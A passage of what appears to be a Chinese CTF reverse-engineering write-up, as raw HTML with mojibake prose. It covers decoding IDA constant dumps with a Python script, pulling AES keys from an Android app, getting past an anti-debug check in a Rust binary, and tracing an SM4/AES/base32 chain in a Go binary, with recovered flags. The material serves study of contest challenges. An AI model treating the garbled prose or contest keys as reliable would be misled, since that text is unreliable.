class="string">__const:0000000100003F58 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F59 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F5D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F60 67                            DCB 0x67 ; g</span></span><br><span class="line"><span class="string">__const:0000000100003F61 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F62 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F63 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F64 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F65 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F66 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F67 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F68 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F69 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6C C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F6D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F70 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F71 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F72 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F73 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F74 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F75 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F76 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F77 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F78 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F79 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F7A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F7D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F7E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F80 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F81 0F                            DCB  0xF</span></span><br><span class="line"><span class="string">__const:0000000100003F82 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F83 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F84 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F85 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F86 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F87 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F88 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F89 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F8A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8C 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F8D 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F8E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F90 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F91 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F92 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F93 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F94 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F95 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F96 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F97 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F98 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F99 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F9A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9C D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F9D 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F9E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA0 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003FA1 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003FA2 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA3 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA4 87                            DCB 0x87</span></span><br><span class="line"><span class="string">__const:0000000100003FA5 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003FA6 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA7 00                            DCB    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†å‰²æ•°æ®</span></span><br><span class="line">lines = data.strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ç»“æœåˆ—è¡¨</span></span><br><span class="line">result = []</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    parts = line.split()</span><br><span class="line">    byte_data = parts[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    hex_data = <span class="built_in">int</span>(byte_data, <span class="number">16</span>)</span><br><span class="line">    a = <span class="built_in">hex</span>(hex_data)[<span class="number">2</span>:]</span><br><span class="line">    a = a.zfill(<span class="number">2</span>)</span><br><span class="line">    k = a+k</span><br><span class="line">    f+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> f==<span class="number">4</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        result.append(<span class="string">&quot;0x&quot;</span>+k)</span><br><span class="line">        k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] = <span class="built_in">int</span>(result[i],<span class="number">16</span>)</span><br><span class="line">    result[i]-=<span class="number">0x1e</span></span><br><span class="line">    result[i]^=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    result[i]-=<span class="number">0x14</span></span><br><span class="line">    result[i]//=<span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">pl(result)</span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="androidso-re">androidso_re</h2><p>æ„Ÿè°¢Zç¥çš„å¸®åŠ©ï¼Œä¸ç„¶å‡­å€Ÿæˆ‘åƒåœ¾çš„å®‰å“èƒ½åŠ›ï¼Œä¸€å®šä¼šè¢«åŠæ­»çš„QAQ</p><p>ä¹‹ååšå®‰å“é¢˜çš„æ—¶å€™</p><p>å…ˆç”¨dieæŸ¥çœ‹å­˜æ¡£è®°å½•ï¼š</p><p><img src="https://s2.loli.net/2024/05/31/onbZYyuX4JrI83f.png" alt="image-20240531202856657"></p><p>è¿™ä¸ªå­˜æ¡£è®°å½•ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯åé¢æœ‰å†™å¯¹åº”çš„å®‰å“ç‰ˆæœ¬ï¼Œå¦‚æœä½¿ç”¨dexç¼–è¾‘å™¨å¯ä»¥çœ‹åˆ°mainactivityåœ¨classes3.dexä¸­ï¼Œ</p><p><img src="https://s2.loli.net/2024/05/31/Tcp2D3Mtrmjgwxz.png" alt="image-20240531204001444"></p><p>è¿™ä¸ªè¡¨æ˜è¦ç”¨å®‰å“7æ¥æ‰“å¼€å®ƒQAQ</p><p>ä¹‹å‰è¯•è¿‡ç”¨å®‰å“10æ¥è°ƒè¯•ï¼Œç»“æœç™¾åˆ†ç™¾å¯„ï¼Œç—›è‹¦ï¼Œç”¨idaè°ƒsoä¹Ÿæ–­ä¸äº†ï¼ŒQAQ</p><p>äºæ˜¯å¯ä»¥é¡ºåˆ©ç”¨å®‰å“7æ‰“å¼€æ¥è°ƒè¯•</p><p>jadxï¼š</p><p><img src="https://s2.loli.net/2024/05/31/yP7mhFSEjxKeCiw.png" alt="image-20240531204430593"></p><p>ç›´æ¥æ‹¿åˆ°å¯†é’¥å’Œiv</p><p>ç›´æ¥è§£</p><p><img src="https://s2.loli.net/2024/05/31/CXcNs7Oa3H5bv8t.png" alt="image-20240531204507379"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">188</span>cba<span class="number">3</span>a<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>fbb<span class="number">2250</span>b<span class="number">5</span>a<span class="number">2e590</span><span class="keyword">c</span><span class="number">391</span>ce&#125;</span><br></pre></td></tr></table></figure><h2 id="rust-baby">rust_baby</h2><p>æ‰“å¼€æ–‡ä»¶</p><p>éšä¾¿è°ƒä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€ä¸ªä¸€å¤§ä¸²è¿ç»­çš„æŒ‡ä»¤ï¼Œåº”è¯¥å°±æ˜¯åŠ å¯†â€­â€­â€­<br>çœ‹åˆ°æœ‰ä¸€å †base64ï¼Œè§£ä¸€ä¸‹</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;henhenaaa!&quot;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;cryforhelp&quot;</span>:<span class="string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;whatadoor&quot;</span>:<span class="string">&quot;1145141919810WTF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iwantovisit&quot;</span>:<span class="string">&quot;O0PSwantf1agnow1&quot;</span></span><br><span class="line">        &#125;&#123;</span><br><span class="line">    <span class="string">&quot;where&quot;</span>:<span class="string">&quot;where is your flag?:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;omg&quot;</span>:<span class="string">&quot;correct flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonono&quot;</span>:<span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;where&quot;</span><span class="punctuation">:</span><span class="string">&quot;where is your flag?:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span><span class="string">&quot;correct flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nonono&quot;</span><span class="punctuation">:</span><span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç”±äºä¸€å¼€å§‹çœ‹åˆ°äº†isdebugpresentï¼Œæ‰€ä»¥å°è¯•äº†é™„åŠ è°ƒè¯•ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™å‘ç°ç¨‹åºä¼šç›´æ¥é€€å‡º</p><p><img src="https://s2.loli.net/2024/05/31/arOtlpSWmDZGj8e.png" alt="image-20240531221756988"></p><p>æ˜¯å› ä¸ºè¿™ä¸ªç¨‹åºæœ‰å¤šä¸ªçº¿ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™ä¸æ˜¯mainçº¿ç¨‹ï¼Œè¿™æ—¶è¦å…ˆåˆ‡æ¢åˆ°mainçº¿ç¨‹å†ç»§ç»­è°ƒè¯•ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111</span></span><br><span class="line"><span class="number">00112233</span></span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">``aabbcc</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span> -<span class="number">1 0 0 1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä¸å†™äº†ï¼Œshi</p><p>QAQ</p><h2 id="go-reverse">go_reverse</h2><p>goé€†å‘</p><p>çœ‹åˆ°å‡½æ•°è¡¨</p><p><img src="https://s2.loli.net/2024/06/04/e8whYgxBtiCNnkV.png" alt="image-20240604004730098"></p><p>åœ¨mainå¼€å¤´çš„å‡½æ•°é‡Œæ‰¾åˆ°äº†è¿™ä¸ª</p><p><img src="https://s2.loli.net/2024/06/04/JODUWdTupR6IwAk.png" alt=""></p><p>æ€€ç–‘æ˜¯aes cbcï¼Œç»è¿‡åˆ†æï¼Œåº”è¯¥æ˜¯</p><p>xor-tea-sm4-aes-base32</p><p>ç„¶åæƒ³äº†å¾ˆä¹…ï¼Œç¡¬æ˜¯æ²¡å‘ç°flagæ˜¯åœ¨å“ªé‡Œçš„ï¼Œæœ€åæ”¾å¼ƒï¼Œå»æ‰¾flagï¼Œå‘ç°é‚£ä¸ªé¢˜æ˜¯ç¯å¢ƒé¢˜ï¼Œé¢˜ç›®åªç»™äº†æœ€åçš„secret</p><p>é‚£ä¹ˆå‡å®š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZR<span class="number">23</span>CZDIW<span class="number">3</span>Q<span class="number">73</span>KKTC<span class="number">3</span>UJKE<span class="symbol">NFAHFUFKOBNMM7</span>FCHXGGY<span class="number">3</span>BJY<span class="number">3</span>B<span class="number">4</span>FWQ<span class="number">4</span>DCI<span class="number">5</span>DQOEEM<span class="name">M5</span>I<span class="number">6</span><span class="meta">O5</span>AZRABU<span class="symbol">NXA7</span>CVWEDYKDOT<span class="number">4</span>JL<span class="attr">VSLE3</span>WFGXI=</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æˆ‘çš„secretï¼ŒQAQ</p><p>è§£å®Œbase32åè§£AESï¼Œè¿™é‡Œçœ‹åˆ°äº†ä¸¤ä¸ªå€¼</p><p>dPGWgcLpqmxw3uOXhKpKV009Cqlå’ŒBs^8*wZ4lu8oR&amp;@k</p><p>ç¬¬ä¸€ä¸ªæ˜¯å¯†é’¥å¯ä»¥è§£å¯†ï¼Œç¬¬äºŒä¸ªåº”è¯¥æ˜¯iv</p><p>ç„¶åç»§ç»­çœ‹sm4ï¼Œä¼ å…¥äº†Bs^8*wZ4lu8oR&amp;@kpg5g#k6Qo3L&amp;1EzT</p><p>å¦‚æœç”¨æµç¨‹å›¾å¯ä»¥çœ‹åˆ°</p><p><img src="https://s2.loli.net/2024/06/05/ILDEUdgBoGJ7TrX.png" alt="image-20240605180853890"></p><p>è¿™é‡Œè¯´æ˜äº†æ¨¡å¼æ˜¯CTR,é€æ­¥åŠ¨è°ƒï¼Œåˆ†åˆ«å¯ä»¥çœ‹åˆ°ä¸€ä¸ª128ä½å€¼ï¼Œä¸€ä¸ª16ä½å€¼ï¼Œå’Œåœ¨è‡ªå·±å†™çš„flagä¸‹é¢ä¸¤æ®µç›¸åŒçš„32ä½å€¼ï¼Œä»¥åŠåŠ¨è°ƒä¸¤æ­¥ï¼Œåœ¨åŠ å¯†å®Œåä¸Šé¢32ä½å€¼ä¸‹é¢æ·»åŠ äº†32ä½å€¼</p><p>å†åŠ¨è°ƒï¼Œå€¼æ²¡äº†</p><p><img src="https://s2.loli.net/2024/06/05/23r9mRsMofBz4Yh.png" alt="image-20240605182238963"></p><p>è€Œä¸‹ä¸€æ­¥çš„è¾“å…¥</p><p><img src="https://s2.loli.net/2024/06/05/4JnEtmdslN1HWOj.png" alt="image-20240605182501943"></p><p>ç”¨è¿™ä¸ªå¯ä»¥çŒœaesçš„keyå’Œivçš„å€¼</p><p><img src="https://s2.loli.net/2024/06/05/8PnRoEYkI7XTZMr.png" alt="image-20240605183107505"></p><p>å‘ç°keyå’Œivæ˜¯ä¸€æ ·çš„ï¼ŒåŒç†ï¼Œåé¢ä¹Ÿä¸çŸ¥é“SM4æ˜¯æ€ä¹ˆåŠ å¯†çš„</p><hr><p>ä¸‹é¢çš„è°ƒè¯•æ­¥éª¤ä¸€å…±è°ƒäº†5æ¬¡ï¼Œå¯èƒ½æ•°æ®å¯¹ä¸ä¸ŠQAQ</p><p>è§‚å¯Ÿè¾“å…¥å’Œè¾“å‡ºï¼Œå·²çŸ¥keyï¼špg5g#k6Qo3L&amp;1EzT</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0xC00001E480</span> - <span class="number">0xC00001E4A0</span> (<span class="number">32</span> bytes) :</span><br><span class="line">[<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>]</span><br><span class="line"></span><br><span class="line">[+] Dump <span class="number">0xC00001A330</span> - <span class="number">0xC00001A360</span> (<span class="number">48</span> bytes) :</span><br><span class="line">[<span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x7D</span>, <span class="number">0xE3</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xAE</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0x1F</span>, <span class="number">0x74</span>, <span class="number">0xCA</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0x69</span>, <span class="number">0xEB</span>, <span class="number">0xF4</span>, <span class="number">0x7E</span>, <span class="number">0xF1</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0xEE</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x05</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0xEA</span>, <span class="number">0x47</span>]</span><br></pre></td></tr></table></figure><p>ä»32å˜æˆäº†48ï¼Œsm4æ˜¯å—åŠ å¯†ï¼Œä¸€å—ä¸º128ä½ï¼Œ16å­—èŠ‚ï¼Œè¾“å…¥æ­£å¥½æ˜¯16çš„å€æ•°ï¼Œä¸åº”è¯¥å¢åŠ ä½æ•°ï¼Œ</p><p>å†æ¬¡è°ƒè¯•ï¼Œå‘ç°inputæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæ˜¯å…ˆå¹²äº†å…¶å®ƒçš„ç„¶åæ‰SM4</p><p>ç»§ç»­è°ƒè¯•ï¼šå¯ä»¥æ¨æµ‹128å­—èŠ‚çš„å€¼æ˜¯sç›’</p><p>åœ¨ä¸€ä¸ªä½ç½®å¾—åˆ°ä¸€ä¸ª16é•¿åº¦çš„å€¼sï¼Œå€¼æ˜¯</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xF5</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0xFD</span>, <span class="number">0xD9</span>, <span class="number">0x8D</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>]</span><br></pre></td></tr></table></figure><p>ä¸‹æ–­ç‚¹ï¼Œå‘ç°å®ƒåœ¨åŠ å¯†ä¸­è¢«è¯»å–äº†ï¼Œå¹¶å‘ç°è¾“å…¥åœ¨åé¢è¢«å¡«å……äº†</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x71</span>, <span class="number">0xBF</span>, <span class="number">0xC2</span>, <span class="number">0x5A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xF3</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x3C</span>]</span><br></pre></td></tr></table></figure><p>ç„¶åsè¢«æ·»åŠ äº†å€¼å˜æˆäº†</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><p>æœ‰32ä¸ªï¼Œåé¢æ·»åŠ çš„å€¼åªæœ‰æœ€åä¸€ä½ä»44å˜æˆäº†64</p><p>è¾“å…¥åœ¨åé¢æ·»åŠ äº†å€¼</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0xBF</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x24</span>, <span class="number">0x77</span>, <span class="number">0x5C</span>, <span class="number">0xAB</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/omLaOgvq9ZEupWe.png" alt="image-20240605204649515"></p><p>raxä¿å­˜äº†è¿™ä¸ªå€¼ï¼Œå®šä½var28</p><p>é‡è°ƒï¼š</p><p><img src="https://s2.loli.net/2024/06/05/8jrNsa1xUFbVPCM.png" alt="image-20240605212044032"></p><p>åœ¨è¾“å…¥æœ«å°¾</p><p><img src="https://s2.loli.net/2024/06/05/icy1wO9dkbgUeGJ.png" alt="image-20240605212131738"></p><p>ä¸´è¿‘ç»“æŸï¼Œè¿™ä¸ªçŠ¶æ€è¿˜åœ¨ï¼Œä¿å­˜ä¸€ä¸‹å€¼</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_ = [<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br><span class="line">p = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/9eXj4CqIRWMgEdi.png" alt="image-20240605213108529"></p><p>è¿™é‡Œä¿å­˜äº†pçš„å‰16ä¸ªå€¼ï¼Œç„¶åpå˜æˆäº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 